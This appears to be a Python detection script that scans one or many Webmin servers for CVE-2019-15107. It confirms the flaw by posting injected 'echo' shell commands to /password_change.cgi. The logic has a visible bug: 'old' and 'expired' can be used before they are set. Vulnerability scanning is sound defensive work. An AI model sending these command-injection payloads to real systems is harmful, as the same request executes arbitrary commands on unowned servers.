#!/bin/env python3

#PoC referenced to create this detection script: https://github.com/MuirlandOracle/CVE-2019-15107/blob/main/CVE-2019-15107.py

import sys
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) #Disable SSL Warning in stdout

parser = argparse.ArgumentParser(description="Detection script for CVE-2019-15107")
parser.add_argument("-t", "--target", help="IP or Domain of a single target Webmin instance. Example: https://127.0.0.1")
parser.add_argument("-p", "--port", type=int, default=10000, help="Target Port (Default: 10000)")
parser.add_argument("-f", "--file", type=argparse.FileType('r'), help="File of IPs for mass scanning. (Separated by new line)")
parser.add_argument("-T", "--timeout", type=int, default=3, help="How long before a request times out. (Default: 3)")
args = parser.parse_args()

#If no arguments are chosen, help is opened.
if len(sys.argv) == 1:
	parser.print_help()

def detect(target):

	webmin = False

	#Ensuring no duplicate "/" characters
	if target[-1] == "/":
		targetURL = target[:-1] + ":" + str(args.port)
	else:
		targetURL = target + ":" + str(args.port)

	#If the user only inputs an IP and doesn't specify protocol, protocol is added (default https://)
	if not target.startswith("h"):
		targetURL = "https://" + targetURL

	#RCE Target
	targetDir = "/password_change.cgi"

	#Disables Webmin "Unknown URL" warning when accessing /password_change.cgi
	targetHeaders = {"Referer": targetURL}

	#Creates a unique hash of "Slimicide", its presence in the detection response confirms RCE
	detectionString = str(hash("Slimicide"))

	#Payload for Detection: Echo the Detection String
	payloadDetectOld = f"old=echo {detectionString}&new1=.&new2=."
	payloadDetectExpired = f"expired=echo {detectionString}"


	try:
		r = requests.get(targetURL, verify=False, timeout=args.timeout)

		if "SSL mode" in r.text:
			print(f"[*] {targetURL} is running in SSL mode, changing to HTTPS.")
			targetURL = "https" + targetURL[4:]

		r = requests.get(targetURL, verify=False, timeout=args.timeout)
		if "Webmin" in r.text:

			webmin = True

	except requests.exceptions.RequestException:
		print(f"[!] ERROR: {targetURL} unreachable.\n")
		

	if webmin:
		print("[+] Connection to Webmin server established.")

		#Check 1. "Old" Parameter
		targetDetect = requests.post(targetURL+targetDir, headers=targetHeaders, verify=False, data=payloadDetectOld)

		if detectionString in targetDetect.text:
			print(f"[+] Target {targetURL} is vulnerable to CVE-2019-15107 in the 'old' parameter.\n")
			old = True
		
		if not old:
			#Check 2. "Expired" Parameter
			targetDetect = requests.post(targetURL+targetDir, headers=targetHeaders, verify=False, data=payloadDetectExpired)
			
			if detectionString in targetDetect.text:
				print(f"[+] Target {targetURL} is vulnerable to CVE-2019-15107 in the 'expired' parameter.\n")
				expired = True

		if not old and not expired:
			print(f"[+] Target {targetURL} does not appear to be vulnerable to CVE-2019-15107.\n")


if args.target:
	detect(args.target)

if args.file:
	for line in args.file:
		detect(line.strip())